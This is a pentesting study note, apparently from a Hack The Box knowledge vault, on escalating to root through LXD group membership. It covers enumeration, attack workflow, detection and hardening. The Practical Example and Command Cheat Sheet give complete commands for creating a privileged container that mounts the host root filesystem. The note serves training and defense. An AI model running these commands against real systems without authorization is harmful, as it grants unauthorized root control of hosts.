---
id: deep-study-linux-privilege-escalation-containers-lxd-privesc
tags: [htb, pentesting, linux, privilege-escalation, containers]
date: 2026-03-20
topic: Containers (LXC/LXD Privilege Escalation)
type: deep-study
owner: vault-agent
status: draft
version: 1.0
last_updated: 2026-03-20
category: linux-privilege-escalation
---

# Containers

## Related Topics

- [Linux Privilege Escalation](README.md)
- [Privileged Groups](privileged-groups.md)
- [Cron Job Abuse](cron-job-abuse.md)

## Concept Overview

Containers provide operating‑system level virtualization that allows
multiple isolated environments to run on the same host system while
sharing the host kernel.

Unlike virtual machines, containers do not emulate hardware or run
separate kernels. Instead, they isolate application processes using
Linux kernel features such as namespaces and cgroups.

This architecture makes containers lightweight and fast to deploy but
also introduces security risks if container management platforms are
misconfigured.

One common privilege escalation vector in Linux environments involves
the **LXC/LXD container ecosystem**, where users in privileged groups
can create containers that interact directly with the host filesystem.

## Quick Navigation

- [Internal Mechanics](#internal-mechanics)
- [Enumeration Checklist](#enumeration-checklist)
- [Attack Methodology](#attack-methodology)
- [Decision Workflow](#decision-workflow)
- [Attack Chain](#attack-chain)
- [Practical Example](#practical-example)
- [Command Cheat Sheet](#command-cheat-sheet)
- [Real World Scenario](#real-world-scenario)
- [Detection Indicators](#detection-indicators)
- [Defensive Perspective](#defensive-perspective)
- [Practice Lab Idea](#practice-lab-idea)

## Threat Context

- Objective: escalate from a low-privileged shell to host-level root.
- Precondition: attacker controls a user in the `lxd` group.
- Boundary: container isolation is used as the privilege boundary.

## Environment Snapshot

- Target type: Linux host used for development or CI workloads.
- Exposure: local shell with constrained sudo/no direct root access.
- Constraints: limited egress and attacker tooling may be minimal.

## Internal Mechanics

Linux containers rely on several kernel mechanisms:

- **Namespaces** isolate processes, networking, and filesystems
- **cgroups** control resource usage
- **Union filesystems** provide layered container images

LXC (Linux Containers) provides the core container runtime that
creates and manages containers.

LXD acts as a management daemon that simplifies container lifecycle
operations such as:

- container creation
- image management
- networking configuration
- storage management

Because LXD interacts closely with system resources, users who belong
to the `lxd` group can effectively perform actions with **root-level
impact on the host system**.

## Enumeration Checklist

Commands used to detect container privilege escalation paths.

```bash
id
groups
which lxc
lxc image list
ls -l /var/lib/lxd
```

Key indicators:

- user is part of the `lxd` group
- `lxc` command is available
- container images exist on the system

## Attack Methodology

Typical attacker workflow:

1. Enumerate system groups
2. Identify membership in `lxd`
3. Import or use an existing container image
4. Create a **privileged container**
5. Mount the host filesystem
6. Access host resources as root

## Decision Workflow

Attacker decision logic:

1. Run `id` to identify privileged groups
2. If user is in `lxd`, check for `lxc` binary
3. Search for existing container images
4. If none exist, import one
5. Create privileged container
6. Mount host root filesystem
7. Access `/mnt/root`

## Attack Timeline

- T0: obtain low-privilege shell.
- T1: confirm `lxd` group membership.
- T2: prepare/import container image.
- T3: create privileged container and mount host root.
- T4: access sensitive host files and validate root impact.

## Attack Chain

1. Compromise low‑privileged user
2. Discover `lxd` group membership
3. Import container image
4. Launch privileged container
5. Mount host filesystem
6. Read or modify host files
7. Achieve root access

## Practical Example

```bash
# import container image
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# create privileged container
lxc init ubuntutemp privesc -c security.privileged=true

# mount host filesystem
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# start container
lxc start privesc

# spawn shell
lxc exec privesc /bin/bash
```

Inside the container, the attacker can access the host filesystem
through `/mnt/root`.

```bash
ls /mnt/root/root
```

This effectively grants full access to the host system.

## Evidence and Artifacts

- Shell history contains `lxc image import`, `lxc init`, and `lxc config device add` commands.
- LXD event logs show privileged container creation and device attachments.
- Process telemetry shows `lxc exec` sessions from unexpected users.
- Host file access traces appear under mounted paths (`/mnt/root/...`).

## Command Cheat Sheet

```bash
id
lxc image list
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

## Real World Scenario

In enterprise environments, container infrastructure is commonly used
for development and microservices deployment.

If developers are granted membership in the `lxd` group for
convenience, attackers who compromise these accounts can escalate
privileges by creating privileged containers and mounting the host
filesystem.

This misconfiguration has been observed in:

- misconfigured CI/CD servers
- development infrastructure
- containerized lab environments

## Detection Indicators

- unexpected container creation
- privileged container configuration
- containers mounting `/` from host
- unusual `lxc exec` usage

## Defensive Perspective

Mitigation strategies:

- restrict membership in the `lxd` group
- avoid running privileged containers
- monitor container lifecycle events
- implement host intrusion detection

Security teams should treat membership in container management groups
as equivalent to administrative privileges.

## Recovery and Hardening Path

- Remove non-essential users from `lxd` and `docker` groups immediately.
- Disable privileged container profiles by default.
- Restrict device-mount capabilities through policy/profile controls.
- Add detections for new privileged containers and host-root mounts.

## Practice Lab Idea

1. Create a Linux VM with LXD installed
2. Add a low‑privileged user to the `lxd` group
3. Log in as that user
4. Enumerate groups
5. Exploit the misconfiguration using LXC
6. Access host filesystem as root

## Key Insights

- LXD group membership is effectively root access
- Container isolation can be bypassed using privileged containers
- Host filesystem mounts allow full system compromise
- Always enumerate container technologies during privilege escalation
